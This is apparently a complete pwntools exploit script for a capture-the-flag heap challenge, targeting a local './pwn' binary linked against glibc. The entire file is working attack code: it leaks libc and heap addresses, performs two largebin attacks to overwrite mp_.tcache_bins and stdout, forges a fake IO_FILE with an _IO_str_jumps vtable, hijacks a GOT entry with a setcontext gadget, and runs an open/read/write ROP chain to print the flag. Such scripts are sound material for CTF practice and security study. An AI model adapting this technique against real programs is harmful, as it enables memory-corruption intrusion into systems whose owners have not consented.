#!/usr/bin/env python3
from pwn import *
from FILE import *

# https://mp.weixin.qq.com/s/vdfDBN6uXd0VvI_WwQ-kgw
# https://www.freebuf.com/articles/system/305858.html

context.arch = 'amd64'
#context.log_level = 'debug'
context.terminal = ['tmux', 'sp', '-h']

local = 1
if local:
    p = process('./pwn')
    elf = ELF('./pwn')
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
else:
    pass

def add(idx, sz):
    p.sendafter(b'Pls input the opcode\n', b'\x01' + p8(idx) + p16(sz) + b'\x05')

def delete(idx):
    p.sendafter(b'Pls input the opcode\n', b'\x02' + p8(idx) + b'\x05')

def show(idx):
    p.sendafter(b'Pls input the opcode\n', b'\x03' + p8(idx) + b'\x05')

def edit(idx, sz, data):
    p.sendafter(b'Pls input the opcode\n', b'\x04' + p8(idx) + p16(sz) + data + b'\x05')

def other(data):
    p.sendafter(b'Pls input the opcode\n', data)

# leak libc
add(0, 0x440)
add(1, 0x4a0)
add(2, 0x410)
add(3, 0x490)
add(4, 0x430)
add(5, 0x490)
add(6, 0x430)
add(9, 0x4c0)
add(10, 0x490)
add(11, 0x490)
add(12, 0x490)
add(13, 0x490)
add(14, 0x490)
add(15, 0x490)
add(16, 0x490)
delete(1) # put 1 into unsortedbin
show(1)
libc_base = u64(p.recv(6).ljust(8, b'\x00')) - 0x21a0d0
info('libc_base = ' + hex(libc_base))

# calculate addresses
if local:
    io_str_jumps = libc_base + 0x2166c0
    tcache_bins = libc_base + 0x219390
    stdout_lock = libc_base + 0x21ba50
    pop_rdi_ret = libc_base + 0x000000000002a6c5
    pop_rsi_ret = libc_base + 0x000000000002c081
    pop_rdx_ret = libc_base + 0x000000000005f65a
    stdout = libc_base + 0x21a848
    memset_ifunc_got = libc_base + 0x0000000000219180
    # 0x00000000000799f1 : mov rdx, rbx ; mov rsi, r10 ; mov rdi, r15 ; call qword ptr [r13 + 0x38]
    # 0x000000000008a383 : mov rdx, rbx ; mov rsi, r12 ; mov rdi, rbp ; call qword ptr [r13 + 0x38]
    # 0x0000000000082356 : mov rdx, rbx ; mov rsi, r13 ; mov rdi, rbp ; call qword ptr [r14 + 0x38]
    call_gadget = libc_base + 0x0000000000082356
else:
    pass
setcontext = libc_base + libc.sym['setcontext']
open_ = libc_base + libc.sym['open']
read = libc_base + libc.sym['read']
write = libc_base + libc.sym['write']

# largebin attack => overwrite mp_.tcache_bins
other(
    b'\x01' + p8(7) + p16(0x500) + # add(7, 0x500) => put 1 into largebin
    b'\x02' + p8(3) + # delete(3) => put 3 into unsortedbin
    b'\x04' + p8(1) + p16(0x20) + (p64(0) * 3 + p64(tcache_bins - 0x20)) + # edit(1, 0x20, payload) <= overwrite 1's bk_nextsize
    b'\x01' + p8(8) + p16(0x410) + # add(8, 0x410) => put 3 into largebin & trigger largebin attack
    b'\x05' # return
)

# set gadget for overwritting memset_ifunc
edit(9, 0x40, p64(call_gadget) + p64(0) * 6 + p64(setcontext + 0x3d))

# leak heap
for i in range(7):
    delete(i + 10) # fill up tcache
show(11)
heap_base = (u64(p.recvuntil(b'\n')[-6:-1].ljust(8, b'\x00')) << 12) - 0x4000
info('heap_base = ' + hex(heap_base))

# forge a fake file
fake_rsp = heap_base + 0x460
chunk_9_addr = heap_base + 0x4190
flag_addr = heap_base + 0x4e0
buffer_addr = flag_addr
fake_file = IO_FILE_plus_struct() # heap_base + 0x26f0
fake_file._IO_write_end = memset_ifunc_got # for fake tacahebins[0x490]
fake_file._IO_buf_base = chunk_9_addr # for memcpy setcontext to memset_ifunc
fake_file._IO_buf_end = chunk_9_addr + 0x216 # => 0x216*2+100=0x490
fake_file._lock = stdout_lock
fake_file._wide_data = fake_rsp # for fake rsp
fake_file._freeres_list = pop_rdi_ret # for return from setcontext's rip
fake_file.vtable = io_str_jumps # change to _IO_str_jumps

#gdb.attach(p, 'b _IO_str_overflow\nb *_IO_str_overflow+151\nb *_IO_str_overflow+212\nc')

# largebin attack => overwrite stdout
payload = (
    b'\x02' + p8(5) + # delete(5) => put 5 into unsortedbin
    b'\x03\x05' * 5 + # show(5) <= padding for fake tcachebins
    b'\x04' + p8(1) + p16(0xd0) + (p64(0) * 3 + p64(stdout - 0x20) + str(fake_file)[0x30:].encode('ISO-8859-1')) + # edit(1, 0xd0, payload) <= overwrite 1's bk_nextsize
    b'\x01' + p8(8) + p16(0x410) # add(8, 0x410) => put 5 into largebin & trigger largebin attack
).ljust(0x1c0, b'\x00')
# orw <= get tcache chunk
payload += (
    p64(flag_addr) + p64(open_) + # open('flag')
    p64(pop_rdi_ret) + p64(3) + p64(pop_rsi_ret) + p64(buffer_addr) + p64(pop_rdx_ret) + p64(0x30) + p64(read) + # read(3, buf, 0x30)
    p64(pop_rdi_ret) + p64(1) + p64(pop_rsi_ret) + p64(buffer_addr) + p64(pop_rdx_ret) + p64(0x30) + p64(write) + # write(1, buf, 0x30)
    b'./flag' # heap_base + 0x4e0
)
other(payload)

#gdb.attach(p)

p.interactive()

